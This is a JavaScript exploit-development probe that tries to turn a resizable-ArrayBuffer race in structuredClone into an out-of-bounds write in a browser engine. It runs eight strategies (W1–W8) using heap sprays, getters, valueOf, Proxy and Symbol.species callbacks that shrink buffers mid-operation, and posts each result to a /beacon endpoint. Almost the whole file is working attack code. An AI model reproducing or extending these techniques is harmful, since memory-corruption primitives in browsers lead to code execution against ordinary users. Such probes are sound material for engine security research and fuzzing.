/* p73-toctou-write — TOCTOU write primitive + heap layout exploitation
 * We have: structuredClone RAB getter-race OOB READ (V69T confirmed).
 * Now: can we get a WRITE primitive from the same bug class?
 *
 * Strategies:
 * W1: structuredClone INTO a RAB — deserializer writes into target buffer
 * W2: TypedArray.set() with getter that resizes destination RAB
 * W3: TypedArray.copyWithin on RAB with getter resize
 * W4: DataView.setXxx on cloned OOB buffer → write to stale region
 * W5: structuredClone of object containing two RABs — shrink one in getter,
 *     use the clone's buffer overlap for R/W
 * W6: Uint8Array.set(source, offset) where offset exceeds shrunk length
 * W7: Array.prototype.sort comparison callback resizes RAB mid-sort
 * W8: TextEncoder.encodeInto with RAB destination + getter resize
 *
 * Beacon prefix: V73W-
 */
(function(){
"use strict";
var RUN_ID = "v73w" + Math.random().toString(36).slice(2,12);
var PREFIX = "V73W-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press73-TOCTOU write primitive");

/* ====== W1: structuredClone deserialize INTO existing RAB ====== */
function test_W1() {
  var r = {};
  try {
    // Can we make structuredClone write its output into a buffer we control?
    // structuredClone always creates NEW objects — but what if we can
    // influence WHERE the new ArrayBuffer is allocated?

    // Test: clone a large buffer, check if clone lands near our spray
    var spray = [];
    for (var i = 0; i < 500; i++) {
      var b = new ArrayBuffer(256);
      var v = new Uint8Array(b);
      for (var j = 0; j < 256; j++) v[j] = 0xEE;
      spray.push(b);
    }

    // TOCTOU clone — get OOB read buffer
    var rab = new ArrayBuffer(512, { maxByteLength: 512 });
    var u8 = new Uint8Array(rab);
    for (var k = 0; k < 512; k++) u8[k] = 0xDD;

    var obj = Object.create(null);
    obj.buf = rab;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(32);
      return 1;
    }});

    var cloned = structuredClone(obj);
    var cv = new Uint8Array(cloned.buf);

    // Write markers into the cloned buffer's OOB region
    // If this buffer overlaps with a spray buffer, the write
    // will corrupt the spray buffer
    var dv = new DataView(cloned.buf);
    for (var m = 32; m < cloned.buf.byteLength; m += 4) {
      dv.setUint32(m, 0xCAFEBABE, true);
    }

    // Check spray buffers for corruption
    var corrupted = 0;
    for (var s = 0; s < spray.length; s++) {
      var sv = new Uint8Array(spray[s]);
      for (var c = 0; c < sv.length; c += 4) {
        if (sv[c] === 0xBE && sv[c+1] === 0xBA && sv[c+2] === 0xFE && sv[c+3] === 0xCA) {
          corrupted++;
          break;
        }
      }
    }

    r.clonedLen = cloned.buf.byteLength;
    r.corrupted = corrupted;
    r.WRITE_PRIMITIVE = corrupted > 0;

    spray = null;
  } catch(e) { r.err = e.message.slice(0,80); }
  B("W1-CLONE-WRITE", r);
}

/* ====== W2: TypedArray.set() with getter that resizes destination ====== */
function test_W2() {
  var r = {};
  try {
    // TypedArray.set(source, offset) copies source into this array
    // If we resize the destination RAB in a getter on the source object...

    var dst = new ArrayBuffer(256, { maxByteLength: 256 });
    var dstArr = new Uint8Array(dst);
    for (var i = 0; i < 256; i++) dstArr[i] = 0xAA;

    // Create a source array-like with a getter
    var src = new Uint8Array(128);
    for (var j = 0; j < 128; j++) src[j] = 0xBB;

    // First: normal set to verify it works
    dstArr.set(src, 0);
    r.normalSet = dstArr[0] === 0xBB && dstArr[127] === 0xBB;

    // Reset destination
    for (var k = 0; k < 256; k++) dstArr[k] = 0xAA;

    // Now: use a Proxy on the source to intercept reads and resize dst
    var resizeCount = 0;
    var proxySrc = new Proxy(src, {
      get: function(target, prop) {
        if (prop === '0' && resizeCount === 0) {
          resizeCount++;
          dst.resize(16); // shrink destination!
        }
        return target[prop];
      }
    });

    try {
      dstArr.set(proxySrc, 64); // write at offset 64, but dst is now only 16 bytes
      r.proxySet = "OK-no-throw";
      r.dstLen = dstArr.length;
      r.OOB_WRITE = dstArr.length < 64 + 128; // wrote past end!
      // Check what bytes look like
      r.dstNow = dst.byteLength;
    } catch(e) {
      r.proxySet = e.name + ":" + e.message.slice(0,50);
    }
    r.resizeCount = resizeCount;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W2-SET-RESIZE", r);
}

/* ====== W3: Direct Uint8Array.set on length-tracking view after resize ====== */
function test_W3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var view = new Uint8Array(rab); // length-tracking

    // Fill with marker
    for (var i = 0; i < 256; i++) view[i] = i;

    // Create source data
    var src = new Uint8Array(128);
    for (var j = 0; j < 128; j++) src[j] = 0xFF;

    // set() with offset that's valid for 256 but not for 32
    // First verify view tracks length
    r.lenBefore = view.length; // 256

    // Use structuredClone getter trick to resize during set
    var triggerObj = Object.create(null);
    triggerObj.data = src;
    Object.defineProperty(triggerObj, 'go', { enumerable: true, get: function() {
      rab.resize(32);
      // Now try to set at offset 128 — view.length is now 32
      try {
        view.set(src, 128);
        r.setAfterShrink = "OK-no-throw";
        r.OOB_WRITE = true;
      } catch(e) {
        r.setAfterShrink = e.name + ":" + e.message.slice(0,50);
      }
      return 1;
    }});

    // Trigger the getter via structuredClone
    structuredClone(triggerObj);

    r.lenAfter = view.length;
    r.rabLen = rab.byteLength;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W3-SET-GETTER", r);
}

/* ====== W4: fill() on RAB-backed TypedArray with resize in valueOf ====== */
function test_W4() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) ta[i] = 0;

    // fill(value, start, end) — what if value.valueOf() resizes the RAB?
    var evil = {
      valueOf: function() {
        rab.resize(16);
        return 0xCC;
      }
    };

    try {
      ta.fill(evil, 0, 256); // fill should check bounds, but valueOf fires mid-op
      r.fillOK = "no-throw";
      r.taLen = ta.length;
      r.rabLen = rab.byteLength;
      // Check if bytes beyond 16 were written
      rab.resize(256); // grow back to check
      var written = 0;
      for (var j = 16; j < 256; j++) {
        if (ta[j] === 0xCC) written++;
      }
      r.writtenBeyond = written;
      r.OOB_WRITE = written > 0;
    } catch(e) {
      r.fillErr = e.name + ":" + e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W4-FILL", r);
}

/* ====== W5: slice() species constructor resize ====== */
function test_W5() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) ta[i] = i;

    // Override Symbol.species to resize during slice
    var origSpecies = Uint8Array[Symbol.species];
    r.hasSpecies = typeof origSpecies !== 'undefined';

    // Try via subclass
    try {
      var resizeDuringConstruct = false;
      class EvilArray extends Uint8Array {
        constructor(...args) {
          super(...args);
          if (!resizeDuringConstruct) {
            resizeDuringConstruct = true;
            rab.resize(16);
          }
        }
      }
      // Create an EvilArray backed by the RAB
      var evil = new EvilArray(rab);
      r.evilLen = evil.length;

      // slice on evil should use EvilArray[Symbol.species] → EvilArray constructor
      resizeDuringConstruct = false;
      try {
        var sliced = evil.slice(0, 256);
        r.sliceOK = "no-throw";
        r.slicedLen = sliced.length;
        r.slicedType = sliced.constructor.name;
        // If slice read 256 bytes but RAB was only 16 → OOB read during slice
        if (sliced.length === 256 && rab.byteLength === 16) {
          r.OOB_READ_SLICE = true;
          // Check for non-pattern bytes
          var foreign = 0;
          for (var k = 16; k < sliced.length; k++) {
            if (sliced[k] !== (k & 0xFF) && sliced[k] !== 0) foreign++;
          }
          r.foreignBytes = foreign;
        }
      } catch(e) {
        r.sliceErr = e.name + ":" + e.message.slice(0,50);
      }
    } catch(e) {
      r.subclassErr = e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W5-SPECIES", r);
}

/* ====== W6: map/filter callback resize ====== */
function test_W6() {
  var r = {};
  try {
    var rab = new ArrayBuffer(128, { maxByteLength: 128 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 128; i++) ta[i] = i;

    var mapCalls = 0;
    var postResizeReads = 0;

    try {
      var mapped = ta.map(function(val, idx) {
        mapCalls++;
        if (idx === 4) {
          rab.resize(8); // shrink after 4th element
        }
        if (idx >= 8) postResizeReads++;
        return val * 2;
      });
      r.mapOK = "no-throw";
      r.mapCalls = mapCalls;
      r.postResizeReads = postResizeReads;
      r.mappedLen = mapped.length;
      // If map continued past index 8 after resize → reading OOB
      r.OOB_MAP = postResizeReads > 0;
      // Check mapped values past resize point
      if (mapped.length > 16) {
        r.sample16 = mapped[16];
        r.sample32 = mapped[32];
      }
    } catch(e) {
      r.mapErr = e.name + ":" + e.message.slice(0,50);
      r.mapCalls = mapCalls;
    }

    // Also test: forEach
    rab.resize(128);
    var forEachCalls = 0;
    var postResizeFE = 0;
    try {
      ta.forEach(function(val, idx) {
        forEachCalls++;
        if (idx === 4) rab.resize(8);
        if (idx >= 8) postResizeFE++;
      });
      r.forEachCalls = forEachCalls;
      r.postResizeFE = postResizeFE;
      r.OOB_FOREACH = postResizeFE > 0;
    } catch(e) {
      r.forEachErr = e.name + ":" + e.message.slice(0,50);
      r.forEachCalls = forEachCalls;
    }

    // Test: reduce
    rab.resize(128);
    for (var m = 0; m < 128; m++) ta[m] = m;
    var reduceCalls = 0;
    try {
      var reduced = ta.reduce(function(acc, val, idx) {
        reduceCalls++;
        if (idx === 4) rab.resize(8);
        return acc + val;
      }, 0);
      r.reduceCalls = reduceCalls;
      r.OOB_REDUCE = reduceCalls > 8;
    } catch(e) {
      r.reduceErr = e.name + ":" + e.message.slice(0,50);
      r.reduceCalls = reduceCalls;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W6-CALLBACK", r);
}

/* ====== W7: indexOf/includes with valueOf resize ====== */
function test_W7() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var ta = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) ta[i] = i;

    var evil = {
      valueOf: function() {
        rab.resize(16);
        return 200; // search for byte 200, which is at index 200 (past shrunk size)
      }
    };

    try {
      var idx = ta.indexOf(evil);
      r.indexOf = idx;
      r.OOB_INDEXOF = idx >= 16; // found it past the shrunk boundary!
      r.rabLen = rab.byteLength;
    } catch(e) {
      r.indexOfErr = e.name + ":" + e.message.slice(0,50);
    }

    // includes
    rab.resize(256);
    for (var j = 0; j < 256; j++) ta[j] = j;
    var evil2 = {
      valueOf: function() {
        rab.resize(16);
        return 200;
      }
    };
    try {
      var inc = ta.includes(evil2);
      r.includes = inc;
      r.OOB_INCLUDES = inc === true; // found byte 200 past shrunk boundary
    } catch(e) {
      r.includesErr = e.name + ":" + e.message.slice(0,50);
    }

    // lastIndexOf
    rab.resize(256);
    for (var k = 0; k < 256; k++) ta[k] = k;
    var evil3 = {
      valueOf: function() {
        rab.resize(16);
        return 100;
      }
    };
    try {
      var lidx = ta.lastIndexOf(evil3);
      r.lastIndexOf = lidx;
      r.OOB_LASTINDEXOF = lidx >= 16;
    } catch(e) {
      r.lastIndexOfErr = e.name + ":" + e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W7-SEARCH", r);
}

/* ====== W8: TextEncoder.encodeInto with resize ====== */
function test_W8() {
  var r = {};
  try {
    r.hasTextEncoder = typeof TextEncoder !== 'undefined';
    if (!r.hasTextEncoder) { B("W8-ENCODE", r); return; }

    var enc = new TextEncoder();
    var rab = new ArrayBuffer(256, { maxByteLength: 256 });
    var dst = new Uint8Array(rab);

    // Normal encodeInto
    var res1 = enc.encodeInto("Hello World", dst);
    r.normalRead = res1.read;
    r.normalWritten = res1.written;

    // Now: resize RAB between creating the view and encoding
    rab.resize(256);
    for (var i = 0; i < 256; i++) dst[i] = 0;

    // Create a long string that fills 256 bytes
    var longStr = "A".repeat(256);

    // Resize in a getter on the string (via toString)
    var evilStr = {
      toString: function() {
        rab.resize(16);
        return longStr;
      }
    };

    try {
      var res2 = enc.encodeInto(evilStr, dst);
      r.evilRead = res2.read;
      r.evilWritten = res2.written;
      r.rabAfter = rab.byteLength;
      r.OOB_ENCODE = res2.written > 16; // wrote past shrunk boundary!
    } catch(e) {
      r.encodeErr = e.name + ":" + e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W8-ENCODE", r);
}

/* ====== Run ====== */
try {
  test_W1();
  setTimeout(test_W2, 300);
  setTimeout(test_W3, 600);
  setTimeout(test_W4, 900);
  setTimeout(test_W5, 1200);
  setTimeout(test_W6, 1500);
  setTimeout(test_W7, 1800);
  setTimeout(test_W8, 2100);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe73-done"); }, 18000);
})();
